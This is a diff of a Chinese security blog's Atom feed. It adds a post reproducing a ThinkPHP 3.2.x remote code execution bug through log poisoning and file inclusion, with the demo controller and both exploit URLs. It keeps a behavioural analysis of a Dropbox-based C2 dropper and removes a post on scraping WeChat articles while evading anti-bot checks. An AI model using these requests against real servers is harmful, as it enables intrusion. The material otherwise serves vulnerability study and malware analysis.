@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-07-03T14:47:02.266Z</updated>
+  <updated>2021-07-12T09:46:23.669Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ThinkPHP3.2.x RCE漏洞复现</title>
+    <link href="http://422926799.github.io/posts/94587123.html"/>
+    <id>http://422926799.github.io/posts/94587123.html</id>
+    <published>2021-07-12T09:32:20.000Z</published>
+    <updated>2021-07-12T09:46:23.669Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10phpstudy 5.6Thinkphp 3.2.3完整版</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p><blockquote><p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p></blockquote><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=&#39;&#39;){        $this-&gt;assign($value);        $this-&gt;display();    }}</code></pre><p>利用步骤：</p><pre><code>1. 创建log2. 包含log</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p><pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p><p>包含log</p><pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p><p>Debug开启和关闭的路径不同:</p><pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;关闭: Application\Runtime\Logs\Home\&lt;log&gt;</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p><p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p><p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p><p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p><p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p><p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p><p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p><p>(不会描述，原文章描述的很好)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/07/12/WiotOO.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Th</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    
+  </entry>
+  
+  <entry>
     <title>某Dropbox c2分析</title>
     <link href="http://422926799.github.io/posts/e5369ead.html"/>
     <id>http://422926799.github.io/posts/e5369ead.html</id>
     <published>2021-07-03T13:44:16.000Z</published>
-    <updated>2021-07-03T14:47:02.266Z</updated>
+    <updated>2021-07-03T14:47:08.374Z</updated>
     
     <content type="html"><![CDATA[<p>样本地址：<a href="https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/" target="_blank" rel="noopener">https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/</a><br>x86 C++编写<br><img src="https://z3.ax1x.com/2021/07/03/RRQwnA.png" alt=""></p><p>该样本是个释放器，用于释放Dropbox的c2<br><img src="https://z3.ax1x.com/2021/07/03/RRQoNV.png" alt=""></p><p>首先搜索当前进程所在路径下的doc、xls、pdf。后缀文件，这三个后缀文件如果搜索到一个则打开<br><img src="https://z3.ax1x.com/2021/07/03/RRQH9U.png" alt=""></p><p>然后休眠2秒<br><img src="https://z3.ax1x.com/2021/07/03/RR88DH.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRQLjJ.png" alt=""></p><p>在C:\Users\Public释放名为spools.exe，最后执行<br><img src="https://z3.ax1x.com/2021/07/03/RR8aPP.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8d8f.png" alt=""></p><p>火绒剑动态监控：<br><img src="https://z3.ax1x.com/2021/07/03/RR8w28.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8DKg.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8zse.png" alt=""></p><p>Dropbox c2分析<br>沙盒执行：<a href="https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c" target="_blank" rel="noopener">https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c</a><br>注册一个窗口类调用sub_404F30函数<br><img src="https://z3.ax1x.com/2021/07/03/RRGFit.png" alt=""></p><p>该函数调用CreateThread创建线程执行<br><img src="https://z3.ax1x.com/2021/07/03/RRt2mF.png" alt=""></p><p>首先检查开机到现在启动的时间，如果该时间小于192000毫秒。则休眠102毫秒<br>然后获取计算机配置构造出要发送的json，进入死循环<br><img src="https://z3.ax1x.com/2021/07/03/RRtWTJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRt5f1.png" alt="计算机配置信息收集"></p><p>构造请求的json<br><img src="https://z3.ax1x.com/2021/07/03/RRtTl6.png" alt=""></p><p>v72+GetLocalTime最终拼接出来的json<br><img src="https://z3.ax1x.com/2021/07/03/RRNSpt.png" alt=""></p><p>IE请求构造<br><img src="https://z3.ax1x.com/2021/07/03/RRNF0g.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNn10.png" alt=""></p><p>在dropbox在给定的路径上创建一个文件夹<br><img src="https://z3.ax1x.com/2021/07/03/RRNucV.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNQnU.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNlBF.png" alt=""></p><p>获取远程的文件夹内容，获取后写入到C:\Users\Public\下的一个文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNt91.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNUc6.png" alt=""></p><p>然后下面上传了一个文件，这里没分析出来是上传了什么<br><img src="https://z3.ax1x.com/2021/07/03/RRNoNj.png" alt=""></p><p>最后远程下载要执行的命令写入到txt，执行完成后上传。最后删除下载的文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNHCn.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNXuT.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRUSUJ.png" alt=""></p><p>最后休眠102毫秒<br><img src="https://z3.ax1x.com/2021/07/03/RRUAKK.png" alt=""></p><p>IOC<br>释放器:0ee449ccbe2e7f413be85b627ca198ba<br>spools.exe md5:b6824c8cb1594e48a8f63d25066e1dde</p>]]></content>
     
@@ -434,29 +457,6 @@ map to guest = Bad </summary>
     
     
     <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>爬取微信公众号小结</title>
-    <link href="http://422926799.github.io/posts/3dedb035.html"/>
-    <id>http://422926799.github.io/posts/3dedb035.html</id>
-    <published>2021-04-11T04:36:54.000Z</published>
-    <updated>2021-04-11T05:23:45.191Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想爬微信公众号然后整成一个bot。试过好几次<br>最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了</p><h2 id="爬取的方法"><a href="#爬取的方法" class="headerlink" title="爬取的方法"></a>爬取的方法</h2><p>网上能搜到的爬取方法：</p><ul><li>微信公众号平台接口抓取|限制:微信KEY有限制，30-40分钟内就会过期。请求次数超过10-20次被封</li><li>搜狗公众号爬取 | 缺陷：只能获取公众号最新更新的一条文章</li></ul><h2 id="爬取实现"><a href="#爬取实现" class="headerlink" title="爬取实现"></a>爬取实现</h2><p>这里是用第二种方法，方法如下<br>搜狗微信公众号搜索对应公众号:<code>https://weixin.sogou.com/weixin?type=1&amp;query=bibacps&amp;ie=utf8</code><br>获取文章链接<br><img src="https://z3.ax1x.com/2021/04/11/cwUusx.png" alt=""></p><p>然后请求这个链接得到wx文章的链接<br><img src="https://z3.ax1x.com/2021/04/11/cwU2yq.png" alt=""></p><p>经过测试，发现并无cookie等效验。访问<code>https://weixin.sogou.com/&lt;sougou_wx_lnk&gt;</code>就可以获取wx文章url。但是，请求次数太多就会出现验证码，只有cookie对了才不会有验证码<br>google后得到解决方法：</p><ul><li>随机UA头</li><li>每次请求之前先获取搜狗子域名cookie</li></ul><p>参考链接:<a href="https://blog.csdn.net/weixin_43881394/article/details/107768458" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43881394/article/details/107768458</a></p><p>获取子域名cookie</p><pre><code class="python">import requestsdef getcookie():    #从搜狗视频获取cookie，防止傻逼搜狗机制检测    url = &#39;https://v.sogou.com/v?ie=utf8&amp;query=&amp;p=40030600&#39;    headers = {&#39;User-Agent&#39;: UserAgent().random}    rst = requests.get(url=url,headers=headers,allow_redirects=False)    cookies = rst.cookies.get_dict()    return cookies</code></pre><p>爬取到wx文章链接后入库</p><p>最终效果如下<br><img src="https://z3.ax1x.com/2021/04/11/cw0RCF.png" alt=""></p><p>Github:<a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96</a></p><h2 id="爬虫小技巧"><a href="#爬虫小技巧" class="headerlink" title="爬虫小技巧"></a>爬虫小技巧</h2><pre><code>爬取大型站点（例如:google.com）可能会遇到的问题：    * 请求次数过多导致验证码    * Cookie判断是否多次请求解决发方法    * 随机IP代理    * 随机UA头    * SESSION请求    * 针对Cookie判断是否多次请求 （这种大型站点cookie生成机制都是一致的，可以请求这种站点的子域名获取cookie。每次请求之前，先从子域名获取cookie然后在用这个cookie请求要爬取的站点）    * 延时请求遇见CSRF TOKEN效验    * TOKEN效验    * COOKIE效验解决方法：    * 这种CRSF TOKEN一般在当前页面存在TOKEN，先获取TOKEN在去请求指定某个地区的IP请求解决方法：    * 使用对应地区的IP请求</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一直想爬微信公众号然后整成一个bot。试过好几次&lt;br&gt;最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了&lt;/p&gt;
-&lt;h2 id=</summary>
-      
-    
-    
-    
-    
-    <category term="爬虫" scheme="http://422926799.github.io/tags/爬虫/"/>
     
   </entry>
   
